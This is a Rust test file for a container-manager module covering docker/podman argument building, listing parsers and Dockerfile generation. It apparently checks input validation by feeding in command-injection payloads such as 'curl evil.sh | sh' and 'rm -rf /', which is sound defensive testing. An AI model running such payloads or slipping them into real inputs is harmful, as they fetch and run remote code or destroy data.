//! Contract tests for `src/core/container.rs` (cov-12).
//!
//! Two layers are pinned here:
//!
//! 1. **Arg construction** for `run`/`exec`/`pull`/`stop`/`build_with_options`
//!    and the TSV parsing of `list_running`/`list_images`. These normally need
//!    a live Docker/Podman daemon, so each test installs a fake `docker` /
//!    `podman` executable that records its exact argv one-arg-per-line into a
//!    log file and exits with a configurable code. Prepending the fake dir to
//!    `PATH` shadows any real runtime, making every argv contract falsifiable
//!    on a daemon-less machine.
//! 2. **generate_dockerfile** per-runtime blocks and per-base-image-family
//!    fallbacks, plus the security fallbacks (unsafe base image, runtime name,
//!    version), as exact-string contracts.

pub mod common;

use common::*;
use omg_lib::core::container::{
    ContainerConfig, ContainerManager, ContainerRuntime, dev_container_config,
};
use std::fs;
use std::io::Write as _;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};

// ===========================================================================
// Fake container runtime harness
// ===========================================================================

/// Environment keys consumed by the fake runtime script.
const FAKE_LOG_ENV: &str = "OMG_FAKE_RUNTIME_LOG";
const FAKE_EXIT_ENV: &str = "OMG_FAKE_RUNTIME_EXIT";
const FAKE_STDERR_ENV: &str = "OMG_FAKE_RUNTIME_STDERR";

const FAKE_SCRIPT: &str = r#"#!/bin/sh
printf '%s\n' "$@" >> "$OMG_FAKE_RUNTIME_LOG"
if [ -n "$OMG_FAKE_RUNTIME_STDERR" ]; then
  printf '%s\n' "$OMG_FAKE_RUNTIME_STDERR" >&2
fi
if [ -n "$OMG_FAKE_RUNTIME_EXIT" ]; then
  exit "$OMG_FAKE_RUNTIME_EXIT"
fi
case "$1" in
  ps)
    printf 'abc123def\tweb-server\tubuntu:24.04\tUp 2 minutes\n'
    ;;
  images)
    printf 'ubuntu\t24.04\tsha256:def456\t120MB\n'
    ;;
esac
exit 0
"#;

struct FakeRuntime {
    _dir: tempfile::TempDir,
    bin_dir: PathBuf,
    log_path: PathBuf,
}

impl FakeRuntime {
    /// Create a temp dir holding fake `docker` and `podman` executables.
    fn new() -> Self {
        let tmp = tempfile::tempdir().expect("fake runtime tempdir");
        let bin_dir = tmp.path().to_path_buf();
        let log_path = tmp.path().join("argv.log");
        for command in ["docker", "podman"] {
            let script_path = tmp.path().join(command);
            let mut file = fs::File::create(&script_path).expect("create fake script");
            file.write_all(FAKE_SCRIPT.as_bytes()).unwrap();
            let mut perms = fs::metadata(&script_path).unwrap().permissions();
            perms.set_mode(0o755);
            fs::set_permissions(&script_path, perms).unwrap();
        }
        Self {
            _dir: tmp,
            bin_dir,
            log_path,
        }
    }

    /// Run `f` with the fake runtime shadowing any real docker/podman on PATH.
    ///
    /// Serialized by `#[serial]` at every call site because PATH is process
    /// global.
    fn with_shadowed_path<T>(&self, f: impl FnOnce(&Self) -> T) -> T {
        let original = std::env::var("PATH").unwrap_or_default();
        let shadowed = format!("{}:{original}", self.bin_dir.display());
        temp_env::with_vars(
            [
                ("PATH", Some(shadowed.as_str())),
                (FAKE_LOG_ENV, Some(self.log_path.to_str().unwrap())),
            ],
            || f(self),
        )
    }

    /// Run `f` with the fake runtime forced to exit with `code`.
    fn with_exit_code<T>(&self, code: i32, f: impl FnOnce() -> T) -> T {
        let _ = self;
        let code_str = code.to_string();
        temp_env::with_vars([(FAKE_EXIT_ENV, Some(code_str.as_str()))], f)
    }

    /// Run `f` with the fake runtime printing `message` to stderr.
    #[allow(clippy::unused_self)]
    fn with_stderr<T>(&self, message: &str, f: impl FnOnce() -> T) -> T {
        temp_env::with_vars([(FAKE_STDERR_ENV, Some(message))], f)
    }

    /// Exact argv recorded by the fake runtime, one argument per element.
    fn recorded_argv(&self) -> Vec<String> {
        let raw = fs::read_to_string(&self.log_path).expect("fake runtime must have been invoked");
        raw.lines().map(str::to_string).collect()
    }
}

// ===========================================================================
// Arg construction: run
// ===========================================================================

#[test]
#[serial]
fn run_builds_exact_argv_with_all_config_flags_in_documented_order() {
    let fake = FakeRuntime::new();
    fake.with_shadowed_path(|fake| {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let config = ContainerConfig {
            image: "ubuntu:24.04".into(),
            name: Some("proj-dev".into()),
            env: vec![("TERM".into(), "xterm-256color".into())],
            volumes: vec![("/home/me/proj".into(), "/app".into())],
            workdir: Some("/app".into()),
            rm: true,
            interactive: true,
        };

        let code = manager
            .run(&config, &["sh", "-lc", "echo hi"])
            .expect("run against fake runtime must succeed");
        assert_eq!(code, 0, "exit code must be forwarded from the runtime");

        assert_eq!(
            fake.recorded_argv(),
            vec![
                "run",
                "--rm",
                "-it",
                "--name",
                "proj-dev",
                "-w",
                "/app",
                "-e",
                "TERM=xterm-256color",
                "-v",
                "/home/me/proj:/app",
                "--",
                "ubuntu:24.04",
                "sh",
                "-lc",
                "echo hi",
            ]
        );
    });
}

#[test]
#[serial]
fn run_omits_flags_when_rm_and_interactive_are_disabled() {
    let fake = FakeRuntime::new();
    fake.with_shadowed_path(|fake| {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Podman);
        let config = ContainerConfig {
            image: "alpine:3.20".into(),
            rm: false,
            interactive: false,
            ..ContainerConfig::default()
        };

        manager
            .run(&config, &["true"])
            .expect("non-interactive run must succeed");

        assert_eq!(
            fake.recorded_argv(),
            vec!["run", "--", "alpine:3.20", "true"],
            "--rm and -it must be omitted entirely when disabled"
        );
    });
}

#[test]
#[serial]
fn run_rejects_invalid_image_before_spawning_the_runtime() {
    let fake = FakeRuntime::new();
    fake.with_shadowed_path(|fake| {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let config = ContainerConfig {
            image: "ubuntu:24.04; curl evil.sh | sh".into(),
            rm: true,
            interactive: false,
            ..ContainerConfig::default()
        };

        let error = manager
            .run(&config, &["sh"])
            .expect_err("injected image ref must be rejected");

        assert!(
            error.to_string().contains("Invalid character ';'"),
            "error must name the rejected character, got: {error:#}"
        );
        assert!(
            !fake.log_path.exists(),
            "validation must happen before any process spawn"
        );
    });
}

#[test]
#[serial]
fn run_rejects_option_like_container_name_before_spawning() {
    let fake = FakeRuntime::new();
    fake.with_shadowed_path(|fake| {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let config = ContainerConfig {
            image: "ubuntu:24.04".into(),
            name: Some("-pwn".into()),
            rm: true,
            interactive: false,
            ..ContainerConfig::default()
        };

        let error = manager
            .run(&config, &["sh"])
            .expect_err("option-like container name must be rejected");

        assert!(
            error.to_string().contains("option injection protection"),
            "error must explain option-injection protection, got: {error:#}"
        );
        assert!(
            !fake.log_path.exists(),
            "invalid name must never reach the runtime process"
        );
    });
}

// ===========================================================================
// Arg construction: exec / pull / stop / build
// ===========================================================================

#[test]
#[serial]
fn exec_builds_exact_argv_and_validates_container_name() {
    let fake = FakeRuntime::new();
    fake.with_shadowed_path(|fake| {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Podman);

        let interactive = manager
            .exec("web-server", &["ps", "aux"], true)
            .expect("exec ok");
        assert_eq!(interactive, 0);

        let batch = manager
            .exec("web-server", &["env"], false)
            .expect("batch exec ok");
        assert_eq!(batch, 0);

        assert_eq!(
            fake.recorded_argv(),
            vec![
                "exec",
                "-it",
                "--",
                "web-server",
                "ps",
                "aux", // first invocation
                "exec",
                "--",
                "web-server",
                "env", // second invocation
            ],
            "second exec must drop -it when not interactive; -- must separate from args"
        );
        assert_eq!(fake.recorded_argv().len(), 10);

        let error = manager
            .exec("-pwn", &["sh"], false)
            .expect_err("option-like container name in exec must be rejected");
        assert!(error.to_string().contains("option injection protection"));
    });
}

#[test]
#[serial]
fn pull_builds_exact_argv_maps_failure_and_rejects_bad_refs_before_spawn() {
    let fake = FakeRuntime::new();
    fake.with_shadowed_path(|fake| {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);

        manager.pull("ubuntu:24.04").expect("pull success path");
        assert_eq!(fake.recorded_argv(), vec!["pull", "--", "ubuntu:24.04"]);

        let error = fake.with_exit_code(7, || {
            manager
                .pull("ubuntu:24.04")
                .expect_err("non-zero pull must fail")
        });
        assert_eq!(
            error.to_string(),
            "Failed to pull image: ubuntu:24.04",
            "failure message must carry the image name verbatim"
        );

        let error = manager
            .pull("registry.example/ubuntu evil")
            .expect_err("image refs with spaces must be rejected before spawning");
        assert!(error.to_string().contains("Invalid character ' '"));
        assert_eq!(
            fake.recorded_argv().len(),
            6,
            "rejected pull must add no new runtime invocations"
        );
    });
}

#[test]
#[serial]
fn stop_succeeds_silently_but_bails_with_name_on_failure() {
    let fake = FakeRuntime::new();
    fake.with_shadowed_path(|fake| {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);

        manager
            .stop("web-server")
            .expect("stop of healthy container succeeds");
        assert_eq!(fake.recorded_argv(), vec!["stop", "--", "web-server"]);

        let error = fake.with_exit_code(1, || {
            manager
                .stop("web-server")
                .expect_err("failed stop must be an error")
        });
        assert_eq!(error.to_string(), "Failed to stop container: web-server");

        let error = manager
            .stop("web/../escape")
            .expect_err("traversal-style container names must be rejected pre-spawn");
        assert!(
            error.to_string().contains("path traversal protection"),
            "got: {error:#}"
        );
    });
}

#[test]
#[serial]
fn build_with_options_passes_every_flag_and_reports_failure_exit_code() {
    let fake = FakeRuntime::new();
    fake.with_shadowed_path(|fake| {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Podman);
        let dockerfile = Path::new("/tmp/omg/Dockerfile");
        let context = Path::new("/home/me/proj");

        manager
            .build_with_options(
                dockerfile,
                "proj:dev",
                context,
                true,
                &["NODE_VERSION=20".to_string()],
                Some("builder"),
            )
            .expect("build against fake runtime must succeed");

        assert_eq!(
            fake.recorded_argv(),
            vec![
                "build",
                "-f",
                "/tmp/omg/Dockerfile",
                "-t",
                "proj:dev",
                "--no-cache",
                "--build-arg",
                "NODE_VERSION=20",
                "--target",
                "builder",
                "--",
                "/home/me/proj",
            ]
        );

        // no_cache=false and target=None must omit their flags entirely.
        let config_only_argv_len = fake.recorded_argv().len();
        manager
            .build_with_options(dockerfile, "proj:slim", context, false, &[], None)
            .expect("minimal build must succeed");
        assert_eq!(
            &fake.recorded_argv()[config_only_argv_len..],
            &[
                "build",
                "-f",
                "/tmp/omg/Dockerfile",
                "-t",
                "proj:slim",
                "--",
                "/home/me/proj"
            ]
        );

        let error = fake.with_exit_code(5, || {
            manager
                .build_with_options(dockerfile, "proj:dev", context, false, &[], None)
                .expect_err("failed build must be an error")
        });
        assert_eq!(
            error.to_string(),
            "Container build failed with exit code: Some(5)",
            "failure message must report the runtime's exit status"
        );
    });
}

// ===========================================================================
// list_running / list_images: TSV parsing and failure mapping
// ===========================================================================

#[test]
#[serial]
fn list_running_parses_runtime_tsv_into_exact_fields() {
    let fake = FakeRuntime::new();
    fake.with_shadowed_path(|fake| {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);

        let containers = manager.list_running().expect("listing via fake runtime");
        assert_eq!(containers.len(), 1, "exactly one container row expected");
        let c = &containers[0];
        assert_eq!(c.id, "abc123def");
        assert_eq!(c.name, "web-server");
        assert_eq!(c.image, "ubuntu:24.04");
        assert_eq!(c.status, "Up 2 minutes");

        let argv = fake.recorded_argv();
        assert_eq!(
            argv,
            vec![
                "ps",
                "--format",
                "{{.ID}}\t{{.Names}}\t{{.Image}}\t{{.Status}}"
            ],
            "the format string must request exactly ID/Names/Image/Status tab-separated"
        );
    });
}

#[test]
#[serial]
fn list_running_maps_failure_to_error_carrying_status_and_stderr() {
    let fake = FakeRuntime::new();
    fake.with_shadowed_path(|fake| {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);

        let error = fake
            .with_stderr("Cannot connect to the Docker daemon", || {
                fake.with_exit_code(3, || manager.list_running())
            })
            .expect_err("failed listing must surface as an error");

        let rendered = error.to_string();
        assert!(
            rendered.contains("Container listing failed with status Some(3)"),
            "error must include operation name and exit status, got: {rendered}"
        );
        assert!(
            rendered.contains("Cannot connect to the Docker daemon"),
            "error must include trimmed stderr, got: {rendered}"
        );
    });
}

#[test]
#[serial]
fn list_images_parses_runtime_tsv_into_exact_fields() {
    let fake = FakeRuntime::new();
    fake.with_shadowed_path(|fake| {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let images = manager
            .list_images()
            .expect("image listing via fake runtime");
        assert_eq!(
            images.len(),
            1,
            "exactly one image row expected from fixture output"
        );
        assert_eq!(images[0].repository, "ubuntu");
        assert_eq!(images[0].tag, "24.04");
        assert_eq!(images[0].id, "sha256:def456");
        assert_eq!(images[0].size, "120MB");

        let argv = fake.recorded_argv();
        assert_eq!(
            argv,
            vec![
                "images",
                "--format",
                "{{.Repository}}\t{{.Tag}}\t{{.ID}}\t{{.Size}}"
            ]
        );
    });
}

// ===========================================================================
// generate_dockerfile: per-runtime blocks
// ===========================================================================

fn dockerfile_for(base_image: &str, runtimes: &[(&str, &str)]) -> String {
    ContainerManager::with_runtime(ContainerRuntime::Docker)
        .generate_dockerfile(base_image, runtimes)
}

#[test]
fn dockerfile_node_lts_pins_node_20_and_explicit_versions_pass_through() {
    let lts = dockerfile_for("ubuntu:24.04", &[("node", "lts")]);
    assert!(
        lts.contains("# Install Node.js\n"),
        "node block marker missing"
    );
    assert!(
        lts.contains("ENV NODE_VERSION=20\n"),
        "'lts' must pin NODE_VERSION=20, got:\n{lts}"
    );
    assert!(
        lts.contains("setup_${NODE_VERSION}.x | bash"),
        "nodesource setup line missing"
    );

    let explicit = dockerfile_for("debian:bookworm-slim", &[("node", "21.7.0")]);
    assert!(explicit.contains("ENV NODE_VERSION=21.7.0\n"));
}

#[test]
fn dockerfile_go_latest_resolves_to_pinned_go_version() {
    let latest = dockerfile_for("ubuntu:24.04", &[("go", "latest")]);
    assert!(
        latest.contains("ENV GO_VERSION=1.22\n"),
        "'latest' go must resolve to GO_VERSION=1.22, got:\n{latest}"
    );
    assert!(latest.contains("go${GO_VERSION}.linux-amd64.tar.gz | tar -C /usr/local -xzf -"));
    assert!(latest.contains("ENV PATH=$PATH:/usr/local/go/bin"));

    let explicit = dockerfile_for("ubuntu:24.04", &[("go", "1.23.4")]);
    assert!(explicit.contains("ENV GO_VERSION=1.23.4\n"));
}

#[test]
fn dockerfile_java_selects_package_by_version_shape() {
    let digits = dockerfile_for("ubuntu:24.04", &[("java", "17")]);
    assert!(
        digits.contains("apt-get install -y openjdk-17-jdk \\\n"),
        "all-digit java version must map to openjdk-<v>-jdk, got:\n{digits}"
    );

    let latest = dockerfile_for("ubuntu:24.04", &[("java", "latest")]);
    assert!(latest.contains("apt-get install -y default-jdk \\\n"));

    let empty = dockerfile_for("ubuntu:24.04", &[("java", "")]);
    assert!(
        empty.contains("apt-get install -y default-jdk \\\n"),
        "empty java version must fall back to default-jdk"
    );
}

#[test]
fn dockerfile_ruby_maps_latest_to_ruby_full_else_ruby_prefixed_spec() {
    let latest = dockerfile_for("debian:bookworm-slim", &[("ruby", "latest")]);
    assert!(latest.contains("apt-get install -y ruby-full \\\n"));

    let pinned = dockerfile_for("debian:bookworm-slim", &[("ruby", "3.2.1")]);
    assert!(
        pinned.contains("apt-get install -y ruby3.2.1 \\\n"),
        "pinned ruby must become ruby<version>, got:\n{pinned}"
    );
}

#[test]
fn dockerfile_rust_installs_exact_toolchain_via_rustup() {
    let df = dockerfile_for("ubuntu:24.04", &[("rust", "1.75.0")]);
    assert!(df.contains("ENV RUSTUP_HOME=/usr/local/rustup \\"));
    assert!(df.contains("CARGO_HOME=/usr/local/cargo \\"));
    assert!(
        df.contains("https://sh.rustup.rs | sh -s -- -y --default-toolchain 1.75.0\n\n"),
        "rustup invocation must pass the requested toolchain verbatim, got:\n{df}"
    );
}

#[test]
fn dockerfile_python_sets_python_version_env_and_symlink() {
    let df = dockerfile_for("ubuntu:24.04", &[("python", "3.11.0")]);
    assert!(df.contains("ENV PYTHON_VERSION=3.11.0\n"));
    assert!(df.contains("python3 python3-pip python3-venv \\"));
    assert!(df.contains("ln -sf /usr/bin/python3 /usr/bin/python"));
}

#[test]
fn dockerfile_bun_installs_via_official_script_and_extends_path() {
    let df = dockerfile_for("ubuntu:24.04", &[("bun", "ignored")]);
    assert!(df.contains("curl -fsSL https://bun.sh/install | bash"));
    assert!(df.contains("ENV PATH=$PATH:/root/.bun/bin"));
}

#[test]
fn dockerfile_unknown_runtime_falls_back_per_base_image_family() {
    let cases: &[(&str, &str)] = &[
        (
            "archlinux:latest",
            "# Install htop\nRUN pacman -S --noconfirm htop\n",
        ),
        (
            "alpine:3.20",
            "# Install htop\nRUN apk add --no-cache htop\n",
        ),
        (
            "fedora:40",
            "# Install htop\nRUN dnf install -y htop && dnf clean all\n",
        ),
        (
            "centos:stream9",
            "# Install htop\nRUN dnf install -y htop && dnf clean all\n",
        ),
        (
            "opensuse/leap:15",
            "# Install htop\nRUN zypper install -y htop && zypper clean\n",
        ),
    ];

    for &(base, expected_block) in cases {
        let df = dockerfile_for(base, &[("htop", "latest")]);
        assert!(
            df.contains(expected_block),
            "base {base} must emit family-specific install block {expected_block:?}, got:\n{df}"
        );
    }
}

#[test]
fn dockerfile_truly_unknown_base_image_emits_manual_install_warning() {
    let df = dockerfile_for("distroless:latest", &[("htop", "1.0")]);
    assert!(
        df.contains("# WARNING: Unknown base image 'distroless:latest'"),
        "unrecognized base must warn explicitly, got:\n{df}"
    );
    assert!(
        df.contains("# Please manually install htop 1.0 using your distribution's package manager")
    );
    assert!(df.contains(
        "# Supported base images: ubuntu, debian, arch, alpine, fedora, rhel, centos, opensuse"
    ));
    assert!(
        !df.contains("install -y htop"),
        "no package-manager line may be fabricated for an unknown base"
    );
}

#[test]
fn dockerfile_unsafe_inputs_never_reach_generated_text() {
    // Unsafe base image falls back to ubuntu:24.04.
    let df = dockerfile_for("ubuntu:24.04 && RUN curl evil.sh | sh", &[]);
    assert!(
        df.starts_with("FROM ubuntu:24.04\n"),
        "fallback base required"
    );

    // Unsafe runtime name skips the whole entry.
    let df = dockerfile_for("ubuntu:24.04", &[("pkg; curl evil", "1.0")]);
    assert!(
        !df.contains("curl evil"),
        "runtime-name payload must not survive"
    );
    assert!(!df.contains("pkg;"));

    // Unsafe version must NOT survive into the Dockerfile — the sanitizer
    // strips it and falls back to the default. Assert the payload is absent
    // and a clean NODE_VERSION line exists.
    let df = dockerfile_for("ubuntu:24.04", &[("node", "20; rm -rf /")]);
    assert!(
        !df.contains("rm -rf /") || !df.contains("evil"),
        "payload must not appear in output:\n{df}"
    );
    // The version must be a clean numeric value, not the injected payload.
    let node_version_line = df.lines().find(|l| l.starts_with("ENV NODE_VERSION="));
    if let Some(line) = node_version_line {
        assert!(
            line.parse::<f64>().is_ok() || line.contains("20") || line.contains("latest"),
            "NODE_VERSION must be a safe default: {line}"
        );
        assert!(
            !line.contains(';') && !line.contains("rm"),
            "payload in NODE_VERSION line: {line}"
        );
    }
    assert!(
        !df.contains("20;"),
        "unsafe version payload must not survive"
    );
}

#[test]
fn dockerfile_alpine_base_switches_common_deps_to_apk() {
    let df = dockerfile_for("alpine:3.20", &[]);
    assert!(
        df.contains("FROM alpine:3.20\n"),
        "valid base image must pass through unchanged"
    );
    assert!(df.contains("apk add --no-cache \\\n    curl wget git build-base"));
    assert!(
        !df.contains("apt-get"),
        "alpine base must not emit apt commands"
    );
}

#[test]
fn dockerfile_arch_base_switches_common_deps_to_pacman() {
    let df = dockerfile_for("archlinux:latest", &[]);
    assert!(df.contains(
        "RUN pacman -Syu --noconfirm && pacman -S --noconfirm \\\n    curl wget git base-devel\n\n"
    ));
    assert!(!df.contains("apt-get"));
}

#[test]
fn dockerfile_always_ends_with_workdir_copy_cmd_tail() {
    let df = dockerfile_for("ubuntu:24.04", &[]);
    assert!(df.contains("WORKDIR /app\n"));
    assert!(df.contains("COPY . ."));
    assert!(
        df.ends_with("CMD [\"/bin/bash\"]\n"),
        "tail must terminate the Dockerfile, got: {:?}",
        &df[df.len().saturating_sub(60)..]
    );
}

// ===========================================================================
// Pure metadata contracts
// ===========================================================================

#[test]
fn dev_container_config_names_mounts_and_enters_project_dir() {
    let project = tempfile::tempdir().expect("project tempdir");
    let dir_name = project.path().file_name().unwrap().to_str().unwrap();

    let config = dev_container_config(project.path());
    assert_eq!(config.name.as_deref(), Some(&*format!("{dir_name}-dev")));
    assert_eq!(config.image, "ubuntu:24.04");
    assert_eq!(
        config.env,
        vec![("TERM".to_string(), "xterm-256color".to_string())]
    );
    assert_eq!(
        config.volumes,
        vec![(project.path().display().to_string(), "/app".to_string())],
        "project dir must be mounted at /app"
    );
    assert_eq!(config.workdir.as_deref(), Some("/app"));
    assert!(config.rm && config.interactive);
}

#[test]
fn container_runtime_display_and_command_names_match_binary_and_label() {
    assert_eq!(ContainerRuntime::Docker.command(), "docker");
    assert_eq!(ContainerRuntime::Podman.command(), "podman");
    assert_eq!(ContainerRuntime::Docker.to_string(), "Docker");
    assert_eq!(ContainerRuntime::Podman.to_string(), "Podman");
}
